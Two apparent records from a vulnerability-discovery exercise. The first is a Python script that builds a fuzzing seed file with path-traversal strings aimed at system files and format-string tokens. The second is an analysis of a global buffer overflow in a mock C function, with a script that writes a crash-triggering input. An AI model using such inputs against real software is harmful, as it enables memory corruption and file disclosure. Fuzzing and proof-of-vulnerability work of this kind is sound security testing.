92aa8416b87f7ed66ec4de6b03abe0235a7b4d7b:
#!/usr/bin/env python3
import struct
import os

def be32(x): return struct.pack(">I", x)
def le32(x): return struct.pack("<I", x)
def be16(x): return struct.pack(">H", x)
def le16(x): return struct.pack("<H", x)
def be64(x): return struct.pack(">Q", x)
def le64(x): return struct.pack("<Q", x)
def si32(x): return struct.pack("<i", x)
def sf32(x): return struct.pack("<f", x)
def sf64(x): return struct.pack("<d", x)

data = bytearray()

# Header-like markers and magic signatures
data += b"MOCKVP\n"
data += b"HELLO\n"
data += b"START\n"
data += b"FUNC_A\n"
data += b"FUNC_B\n"
data += b"%PDF-1.7\n"
data += b"\x7fELF" + b"\x00" * 12 + b"\n"
data += b"\x89PNG\r\n\x1a\n"
data += b"GIF89a"
data += b"PK\x03\x04"
data += b"BM"
data += b"ID3"
data += b"fLaC"
data += b"OggS"
data += b"RIFF\x24\x00\x00\x00WAVE"

# HTTP-like request with body
data += (
    b"GET /test?x=1&y=2 HTTP/1.1\r\n"
    b"Host: example.com\r\n"
    b"User-Agent: fuzz\r\n"
    b"Content-Length: 4\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    b"ABCD"
)

# Common config/text tokens and booleans
data += (
    b"\n"
    b"OPTION enable=1 debug=1 verbose=1\n"
    b"TRUE true\nFALSE false\nNULL null\nON on\nOFF off\nYES yes\nNO no\n"
    b"MODE test\n"
    b"END\n"
)

# JSON-like and XML-like payloads
data += (
    b'{"cmd":"test","value":123,"arr":[0,1,2,3],"flag":true,"name":"FUZZ","hex":"0xdeadbeef"}\n'
)
data += (
    b"<root><cmd>test</cmd><value>123</value><flag>true</flag><name>FUZZ</name></root>\n"
)

# Path and filenames
data += (
    b"../../etc/passwd\n"
    b"..\\..\\windows\\system32\\drivers\\etc\\hosts\r\n"
    b"/tmp/test\0C:\\temp\\test\0\n"
)

# Numbers and edge values
nums_txt = [
    b"0", b"1", b"-1", b"2", b"10", b"255", b"256", b"1024",
    b"4096", b"8192", b"16384", b"32767", b"32768",
    b"2147483647", b"-2147483648", b"4294967295",
    b"0x0", b"0x1", b"0x7fffffff", b"0x80000000", b"0xffffffff",
    b"inf", b"-inf", b"nan", b"1.0", b"-0.0", b"3.14159"
]
for t in nums_txt:
    data += b"NUM " + t + b"\n"

# Format string-ish inputs
data += b"%x%x%x%x%n\n%s\n%p\n%%\n"

# Unicode and UTF-8 sequences
data += "UTF8: €😀漢字😊🚀\n".encode("utf-8")

# NUL-separated key-value pairs
data += b"key1\0value1\0key2\0value2\0\0"

# Length-prefixed binary blocks (various endians)
block1 = b"ABCDEFGH"
data += b"LEN_LE32 " + le32(len(block1)) + block1 + b"\n"

block2 = b"WXYZ"
data += b"LEN_BE32 " + be32(len(block2)) + block2 + b"\n"

block3 = b"\x00\x01\x02\x03\x04\x05\x06\x07"
data += b"LEN_LE16 " + le16(len(block3)) + block3 + b"\n"

block4 = b"\xff\xfe\xfd\xfc"
data += b"LEN_BE16 " + be16(len(block4)) + block4 + b"\n"

block5 = b"longlong!!"
data += b"LEN_LE64 " + le64(len(block5)) + block5 + b"\n"

# Binary integers and floats (little and big endian)
data += b"BIN_I32 " + si32(-1) + si32(0) + si32(1) + si32(2147483647) + si32(-2147483648) + b"\n"
data += b"BIN_U32 " + le32(0) + le32(1) + le32(0x7fffffff) + le32(0x80000000) + le32(0xffffffff) + b"\n"
data += b"BIN_U16 " + le16(0) + le16(1) + le16(0x7fff) + le16(0x8000) + le16(0xffff) + b"\n"
data += b"BIN_F32 " + sf32(0.0) + sf32(-0.0) + sf32(1.5) + sf32(float("inf")) + sf32(float("-inf")) + sf32(float("nan")) + b"\n"
data += b"BIN_F64 " + sf64(0.0) + sf64(3.141592653589793) + sf64(float("inf")) + sf64(float("-inf")) + sf64(float("nan")) + b"\n"

# Repeated patterns and boundaries
data += b"A" * 1024 + b"\n"
data += b"B" * 2048 + b"\n"
data += b"C" * 4096 + b"\n"

# All-bytes sweep up and down
data += bytes(range(256))
data += bytes(reversed(range(256)))

# Zero bytes and 0xFF blocks
data += b"\x00" * 32 + b"\n" + b"\xff" * 32 + b"\n"

# Zlib/gzip-like headers and random-ish binary
data += b"\x78\x9c" + b"\x00" * 32  # zlib header + zeros
data += b"\x1f\x8b\x08\x00" + b"\x00" * 32  # gzip header + zeros

# Command-like tokens that may be recognized
cmds = [
    b"CMD START\n",
    b"SET key=value\n",
    b"ENABLE feature_x\n",
    b"DISABLE feature_y\n",
    b"PRINT status\n",
    b"RESET\n",
    b"QUIT\n",
    b"END\n",
]
for c in cmds:
    data += c

# HTTP-like response too
data += (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Type: text/plain\r\n"
    b"Content-Length: 5\r\n"
    b"\r\n"
    b"HELLO"
)

# Trailing mixed newlines and terminators
data += b"\r\n\n\0END\0\n"

# Ensure bounded size (optional trimming if overly large)
max_size = 64 * 1024
if len(data) > max_size:
    data = data[:max_size]

with open("test_input.bin", "wb") as f:
    f.write(data)
22210f0a148822ffa3ca0d2fd53896cda85789d8:
Analysis
- Root cause: func_a writes user input into a global 2D array items without any bounds check on the row index i. Each loop:
  1) buff = &items[i][0];
  2) i++;
  3) fgets(buff, 40, stdin);
  continues while the read line is non-empty.
- When the number of non-empty input lines exceeds the number of rows in items (call it N), at the iteration where i == N, buff becomes &items[N][0], which is past the end of the global array. The subsequent fgets writes to this out-of-bounds location, producing an AddressSanitizer: global-buffer-overflow.
- To reliably trigger it:
  - Feed more than N non-empty lines so i advances to N.
  - Make the line at i == N still a real line (so fgets writes to the OOB pointer). Using 39 'A' characters plus a newline makes fgets write a full 40-byte line, increasing the chance of a clear ASan report.
  - Finish with an empty line ("\n") so the loop terminates cleanly.
- Practical considerations with the harness:
  - The pipe write happens before reading; keep the payload well under typical pipe capacity (~64 KiB) to avoid blocking. For example, 128 lines of 40 bytes each plus a final newline ≈ 5121 bytes is safe.
  - The read end is non-blocking; providing enough data upfront (as we do) avoids EAGAIN surprises.

Below is a Python script that creates pov_input.bin with 128 full lines (39 'A's + '\n') to safely exceed typical items sizes, followed by an empty line to end the loop.

```python
# Generate a PoV that triggers a global-buffer-overflow in func_a by
# providing more non-empty lines than the number of rows in the global
# items array, then an empty line to terminate the loop.

def main():
    # Each non-empty line is 39 'A's + '\n' so fgets(buff, 40, ...) writes a full line.
    line = b"A" * 39 + b"\n"

    # Use a count comfortably larger than typical items row counts (e.g., 128).
    # This keeps the file size small (~5 KB) and below pipe capacity.
    non_empty_lines = 128

    payload = line * non_empty_lines
    payload += b"\n"  # empty line to end the loop

    with open("pov_input.bin", "wb") as f:
        f.write(payload)

    print(f"Wrote {len(payload)} bytes to pov_input.bin "
          f"({non_empty_lines} non-empty lines + final empty line).")

if __name__ == "__main__":
    main()
```
